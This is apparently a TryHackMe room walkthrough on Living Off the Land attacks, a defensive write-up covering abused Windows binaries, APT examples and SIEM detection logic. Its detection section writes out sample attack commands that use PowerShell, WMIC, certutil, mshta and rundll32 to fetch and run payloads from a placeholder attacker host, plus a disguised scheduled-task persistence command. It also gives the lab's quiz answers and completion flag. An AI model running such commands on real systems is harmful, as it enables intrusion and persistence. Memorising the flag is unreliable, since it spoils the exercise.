---
icon: tree
cover: >-
  https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/66264cef7bba67a6bbbe7179-1756704994307
coverY: 0
coverHeight: 139
---

# Living Off the Land Attacks

**Date:** 03.05.2026&#x20;

**Room Category:** Walkthrough&#x20;

**Core Concept:** Understanding, analyzing, and detecting Living Off the Land (LoL) techniques where adversaries abuse trusted, native operating system tools to achieve their objectives.

Attackers do not always rely on custom malware or dropped executables. They frequently leverage trusted system utilities already present on the target machine. This document explores the concept of Living Off the Land attacks, the specific Windows tools commonly abused, and the methodologies required to detect them through log and behavioral analysis.

***

## Task 1: Introduction

The primary objective is to learn what Living Off the Land (LoL) attacks are, understand why threat actors utilize them, and recognize how defenders can identify this behavior by analyzing logs and SIEM alerts.

Question: Click to start learning about Living Off The Land techniques!

> **Answer:** No answer needed

***

## Task 2: Common LoL Tools and Techniques

Threat actors utilize Living Off the Land techniques because built-in tools are inherently trusted, widely available, and typically permitted by default security controls. This allows malicious activity to blend seamlessly with routine administrative operations. These techniques enable adversaries to execute code without dropping new binaries, bypass execution policies, and reuse legitimate credentials, thereby reducing noise and slowing detection.

**Commonly Abused Tools:**

* **PowerShell:** Utilized for in-memory scripting, remote payload downloads, and automation.
* **WMIC (Windows Management Instrumentation Command-line):** Used to execute commands locally or on remote hosts, and to query the system state.
* **Certutil:** A certificate management tool abused to fetch files and encode or decode payloads.
* **Mshta:** Used to run HTML Application (HTA) content or inline scripts delivered via documents or links.
* **Rundll32:** Abused to invoke DLL exports or trigger URL handlers.
* **Scheduled Tasks (schtasks):** Leveraged to execute code at logon or on a repeating schedule for persistence.
* **Sysinternals Suite:** Legitimate signed administrative utilities, such as PsExec (for remote execution) and Autoruns (for persistence manipulation), are frequently hijacked because they mimic standard admin workflows.

**Public Documentation Resources:**

* **LOLBAS:** A comprehensive project documenting Living Off The Land Binaries and Scripts for Windows.
* **GTFOBins:** A curated list of Unix and Linux binaries that can be abused to bypass local security restrictions.

**Defensive Measures:**

* Implement layered defensive controls combining endpoint, network, and identity protections.
* Deploy application control policies (e.g., AppLocker or Windows Defender Application Control) to explicitly define permitted scripts and executables.
* Enforce the principle of least privilege, ensuring only authorized administrators can access system management utilities.
* Configure network rules and DNS filters to block connections to known malicious infrastructure.
* Maintain strict containment playbooks and regularly audit access permissions and logging coverage.

Question: Which public site lists Unix/Linux native binaries and how they can be abused?

> **Answer:** GTFOBins

Question: Which Microsoft toolset includes PsExec and Autoruns, used for admin tasks and often misused by attackers?

> **Answer:** Sysinternals

***

## Task 3: Real-World Examples

Organized threat groups, including state-sponsored Advanced Persistent Threats (APTs) and financially motivated ransomware operators, heavily rely on LoL techniques.

**APT29 (Nobelium) - WMI and PowerShell:** APT29 utilizes fileless techniques by combining PowerShell with WMI event subscriptions (MITRE ATT\&CK T1546.003). The payload is stored directly within WMI properties. When triggered, the payload is read, decrypted, and executed in memory, leaving virtually no artifacts on the disk.

**BlackCat (ALPHV) Ransomware - Lateral Movement:** The ALPHV group utilizes built-in tools like PowerShell for defense evasion, PsExec for lateral movement and remote execution, and Certutil to fetch and decode payloads directly on target hosts.

**Cobalt Strike Loaders (QakBot and IcedID):** Loaders such as QakBot and IcedID frequently stage Cobalt Strike beacons using signed Windows binaries. They utilize `rundll32.exe` and `mshta.exe` to bootstrap payloads in memory, making the execution chain appear as a benign system process.

Question: What MITRE technique ID covers WMI event subscriptions?

> **Answer:** T1546.003

Question: Which abbreviated name refers to one of the services that C2s, like Cobalt Strike, use to start or listen for remote services?

> **Answer:** SMB

***

## Task 4: Detecting LOL Activity

Detecting LoL attacks requires analyzing command-line parameters to differentiate malicious intent from legitimate administrative use.

#### PowerShell

Attackers use PowerShell to run scripts entirely in memory, download payloads, and bypass execution policies.

* **Malicious Commands:**
  * `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"`
  * `powershell -NoP -NonI -W Hidden -EncodedCommand SQBn...Base64...`
* **Detection Logic:** Monitor Event IDs 4688 (Process Creation), 1 (Sysmon), or 4104 (PowerShell Script Block Logging) for keywords like `IEX`, `-EncodedCommand`, `-Exec Bypass`, `Invoke-WebRequest`, or `DownloadString`.

#### WMIC

WMIC is abused for remote command execution and reconnaissance.

* **Malicious Commands:**
  * `wmic /node:TARGETHOST process call create "powershell -NoP -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"`
  * `wmic process call create "notepad.exe" /hidden`
* **Detection Logic:** Monitor for `wmic.exe process call create` or `wmic /node: process call create` within process creation logs.

#### Certutil

Certutil is intended for certificate management but is highly effective at downloading and decoding payloads.

* **Malicious Commands:**
  * `certutil -urlcache -split -f "http://attacker.example/payload.exe" C:\Users\Public\payload.exe`
  * `certutil -decode C:\Users\Public\encoded.b64 C:\Users\Public\decoded.exe`
* **Detection Logic:** Flag instances of `certutil.exe` executed with `-urlcache`, `-f`, `-decode`, or `-encode` flags.

#### MSHTA

Mshta executes HTML Applications, running embedded VBScript or JavaScript natively.

* **Malicious Commands:**
  * `mshta "http://attacker.example/payload.hta"`
  * `mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell ...');close();"`
* **Detection Logic:** Look for `mshta.exe` commands containing `http://`, `javascript:`, or `.hta` file extensions.

#### Rundll32

Rundll32 is used to execute specific exported functions from DLL files.

* **Malicious Commands:**
  * `rundll32.exe C:\Users\Public\backdoor.dll,Start`
  * `rundll32.exe url.dll,FileProtocolHandler "http://attacker.example/update.html"`
* **Detection Logic:** Monitor for `rundll32.exe` targeting suspicious directories (e.g., `\Users\Public\`, `\Windows\Temp\`) or utilizing specific handlers like `url.dll,FileProtocolHandler`.

#### Scheduled Tasks (schtasks)

Task Scheduler is heavily abused for establishing persistence that survives system reboots.

* **Malicious Commands:**
  * `schtasks /Create /SC ONLOGON /TN "WindowsUpdate" /TR "powershell -NoP -NonI -Exec Bypass -Command ..."`
  * `schtasks /Run /TN "WindowsUpdate"`
* **Detection Logic:** Monitor Security Event IDs 4698 (Task Creation) and 4699, or Sysmon process events involving `schtasks /Create`, `schtasks /Run`, or `taskeng.exe`.

Question: Which PowerShell switch is used to download text/strings and execute them?

> **Answer:** IEX

Question: Which WMIC keyword triggers the creation of a new process on a remote host?

> **Answer:** create

***

## Task 5: Practical

This practical exercise involves accessing the simulated SOC dashboard to classify SIEM alerts based on the exact LoL techniques outlined in the previous tasks. Classifying these correctly yields the completion flag.

Question: What is the flag?

> **Answer:** THM{LOL-but-not-that-lol-you-finishit}

***

## Conclusion

Living Off the Land attacks necessitate a shift in detection strategy. Instead of looking purely for malicious binaries, defenders must analyze process command lines and behavioral sequences to identify legitimate administrative tools being used with malicious intent.

**Summary of Capabilities:**

* **PowerShell:** Fileless, in-memory execution.
* **WMIC:** Remote process creation and environment reconnaissance.
* **Certutil:** Downloading, encoding, and decoding payloads.
* **Mshta & Rundll32:** Executing scripts or DLL-based payloads directly from memory or disk.
* **Scheduled Tasks:** Establishing stealthy system persistence.
